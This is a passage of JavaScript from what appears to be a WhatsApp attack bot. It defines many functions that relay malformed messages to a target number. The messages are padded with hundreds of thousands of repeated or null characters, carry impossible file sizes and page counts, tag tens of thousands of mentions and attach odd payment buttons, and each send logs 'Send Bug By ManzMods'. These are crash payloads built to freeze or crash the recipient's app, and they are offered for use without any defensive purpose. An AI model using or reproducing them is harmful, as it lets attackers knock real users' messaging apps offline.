                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: p185
                },
                hasMediaAttachment: true
              },
              body: {
                text: "🐉⃟༑⌁⃰𝐆‌𝐞‌𝐭𝐬𝐮‌‌𝐙‌‌𝐨 𝐋𝐨‌𝐜‌‌𝐤 𝐔‌‌𝐢 ཀ‌‌〽️" + "ꦾ".repeat(50500)
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [p186 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"␭" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"␭\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"␭\",\"sections\":[{\"title\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"␭\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p184,
        quoted: v211
      });
      await p154.relayMessage(p184, vGenerateWAMessageFromContent41.message, p187 ? {
        participant: {
          jid: p184
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f66(p188, p189, p190, p191 = false, p192 = false) {
      let vGenerateWAMessageFromContent42 = generateWAMessageFromContent(p188, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: p190
                },
                hasMediaAttachment: true
              },
              body: {
                text: "🐉⃟༑⌁⃰𝐃𝐞𝐚𝐝𝑳𝒐𝒄𝒌 𝐔𝐈 ཀ‌‌🩸" + "@ܔ͙̽̏̈́۬͜͢".repeat(50000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [p191 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝕿𝖍𝖊𝕲𝖊𝖙𝖘𝖚𝖟𝖔𝖅𝖍𝖎𝖗𝖔ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"🎭⃟༑⌁⃰𝕿𝖍𝖊𝕲𝖊𝖙𝖘𝖚𝖟𝖔𝖅𝖍𝖎𝖗𝖔ཀ͜͡🐉\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝕿𝖍𝖊𝕲𝖊𝖙𝖘𝖚𝖟𝖔𝖅𝖍𝖎𝖗𝖔ཀ͜͡🐉\",\"sections\":[{\"title\":\"🎭⃟༑⌁⃰𝕿𝖍𝖊𝕲𝖊𝖙𝖘𝖚𝖟𝖔𝖅𝖍𝖎𝖗𝖔ཀ͜͡🐉\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p188,
        quoted: p189
      });
      await p154.relayMessage(p188, vGenerateWAMessageFromContent42.message, p192 ? {
        participant: {
          jid: p188
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f67(p193, p194, p195, p196 = false, p197 = false) {
      let vGenerateWAMessageFromContent43 = generateWAMessageFromContent(p193, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: p195
                },
                hasMediaAttachment: true
              },
              body: {
                text: "🎭⃟༑⌁⃰𝕿𝖍𝖊𝕲𝖊𝖙𝖘𝖚𝖟𝖔𝖅𝖍𝖎𝖗𝖔ཀ͜͡🐉" + _0x379f7f
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [p196 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"𝐌 𝐀 𝐍 𝐙 ▾" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"༑⌁⃰ꦾཀ͜͡\",\"sections\":[{\"title\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"༑⌁⃰ꦾཀ͜͡\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p193,
        quoted: p194
      });
      await p154.relayMessage(p193, vGenerateWAMessageFromContent43.message, p197 ? {
        participant: {
          jid: p193
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f68(p198, p199, p200, p201 = true) {
      await p154.relayMessage(p198, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: p199,
                format: "EXTENSIONS_1"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(p200) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                version: 3
              }
            }
          }
        }
      }, p201 ? {
        participant: {
          jid: p198
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f69(p202, p203, p204, p205 = true) {
      let vGenerateWAMessageFromContent44 = generateWAMessageFromContent(p202, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: p204
              },
              nativeFlowMessage: {
                messageParamsJson: " ManzX guarantees all phones :) \n\n\n I know, you tried to copy this bug with m.quoted/m.message, right ? "
              },
              carouselMessage: {}
            }
          }
        }
      }), {
        userJid: p202,
        quoted: p203
      });
      await p154.relayMessage(p202, vGenerateWAMessageFromContent44.message, p205 ? {
        participant: {
          jid: p202
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f70(p206, p207 = true) {
      let vGenerateWAMessageFromContent45 = generateWAMessageFromContent(p206, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "͢rē̽pē͢ค̽tē̏r🦠⃟",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: "͢rē̽pē͢ค̽tē̏r🦠⃟̤" + _0x379f7f
              },
              nativeFlowMessage: {
                name: "call_permission_request",
                messageParamsJson: " 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 "
              },
              carouselMessage: {}
            }
          }
        }
      }), {
        userJid: p206,
        quoted: v210
      });
      await p154.relayMessage(p206, vGenerateWAMessageFromContent45.message, p207 ? {
        participant: {
          jid: p206
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f71(p208, p209 = true) {
      let vGenerateWAMessageFromContent46 = generateWAMessageFromContent(p208, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ▾ ༑̴⟆̊⿻‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: " ManzX Company Tagline Here!! \n\n\n You Stupid?? ",
                buttons: [{
                  name: "payment_info",
                  buttonParamsJson: "{\"currency\":\"IRP\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"XXX\",\"key\":\"+99999999999\",\"key_type\":\"XXX\"}}]}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p208
      });
      await p154.relayMessage(p208, vGenerateWAMessageFromContent46.message, p209 ? {
        participant: {
          jid: p208
        }
      } : {});
    }
    async function f72(p210) {
      await p154.relayMessage(p210, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                subtitle: " ꦾ".repeat(900000),
                title: "",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: ""
              },
              carouselMessage: {}
            }
          }
        }
      }, {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f73(p211, p212) {
      await p154.relayMessage(p211, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉" + _0x5a97d2
              },
              nativeFlowMessage: {
                messageParamsJson: ""
              },
              carouselMessage: {}
            }
          }
        }
      }, {
        participant: {
          jid: p211
        }
      });
      let v214 = fs.readFileSync("./all/image/XY.webp");
      await p154.sendMessage(p211, {
        sticker: v214
      }, {
        quoted: p212
      });
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f74(p213, p214) {
      await p154.relayMessage(p213, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉" + "\0".repeat(950000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\0"
              },
              carouselMessage: {}
            }
          }
        }
      }, {
        participant: {
          jid: p213
        }
      });
      await p154.sendMessage(p213, {
        text: "ܜ̽̽̽̽ᝄ͢`𐁘"
      }, {
        quoted: p214
      });
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f75(p215) {
      await p154.relayMessage(p215, {
        paymentInviteMessage: {
          serviceType: "FBPAY",
          expiryTimestamp: Date.now() + 1814400000
        }
      }, {
        participant: {
          jid: p215
        }
      });
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f76(p216) {
      p154.relayMessage(p216, {
        extendedTextMessage: {
          text: ".",
          contextInfo: {
            stanzaId: p216,
            participant: p216,
            quotedMessage: {
              conversation: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(50000)
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            }
          },
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }, {
        participant: {
          jid: p216
        }
      }, {
        messageId: null
      });
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f77(p217) {
      p154.relayMessage(p217, {
        paymentInviteMessage: {
          serviceType: "UPI",
          expiryTimestamp: Date.now() + 86400000
        }
      }, {
        participant: {
          jid: p217
        }
      });
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f78(p218, p219, p220 = true) {
      await p154.relayMessage(p218, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: p219
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@6281991410940".repeat(17000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉', url: \"https://youtube.com/manzmods\", merchant_url: \"https://youtube.com/manzmods\" }"
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["6281991410940@s.whatsapp.net", ...Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️" + _0x4e7693,
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, p220 ? {
        participant: {
          jid: p218
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f79(p221, p222, p223 = true) {
      await p154.relayMessage(p221, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: p222
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@6281991410940".repeat(17000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉', url: \"https://youtube.com/manzmods\", merchant_url: \"https://youtube.com/manzmods\" }"
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["6281991410940@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, p223 ? {
        participant: {
          jid: p221
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f80(p224, p225, p226 = true) {
      let vGenerateWAMessageFromContent47 = generateWAMessageFromContent(p224, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: p225
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@6281991410940".repeat(17000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉', url: \"https://youtube.com/manzmods\", merchant_url: \"https://youtube.com/manzmods\" }"
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["6281991410940@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
